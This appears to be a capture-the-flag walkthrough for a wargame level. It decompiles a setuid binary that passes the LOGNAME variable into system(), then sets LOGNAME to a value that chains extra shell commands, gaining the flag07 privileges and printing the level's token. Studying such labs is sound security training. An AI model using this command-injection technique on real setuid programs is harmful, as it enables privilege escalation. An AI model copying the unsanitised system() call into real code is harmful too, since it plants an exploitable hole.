
-> ls -la

one interesting file

-rwsr-sr-x 1 flag07 level07 ... level07

-> ./level07

level07
From level07 on ida we get:
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // eax
  char *v5; // [esp+14h] [ebp-Ch] BYREF
  __gid_t v6; // [esp+18h] [ebp-8h]
  __uid_t v7; // [esp+1Ch] [ebp-4h]

  v6 = getegid();
  v7 = geteuid();
  setresgid(v6, v6, v6);
  setresuid(v7, v7, v7);
  v5 = 0;
  v3 = getenv("LOGNAME");
  asprintf(&v5, "/bin/echo %s ", v3);
  return system(v5);
}

-> strings level07

So an interesting string is found followed by /bin/echo :

LOGNAME
/bin/echo %s

So looks very likely that the script will run /bin/echo %s
with the env var LOGNAME as %s

Let's go !

So i'll check the value of LOGNAME and try to change it

-> printenv | grep LOGNAME

LOGNAME=level07

-> export LOGNAME="pop && whoami && getflag"

-> printenv | grep LOGNAME

LOGNAME=pop && whoami && getflag
-> whoami
level07
-> ./level07
pop
flag07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-> su level08 ..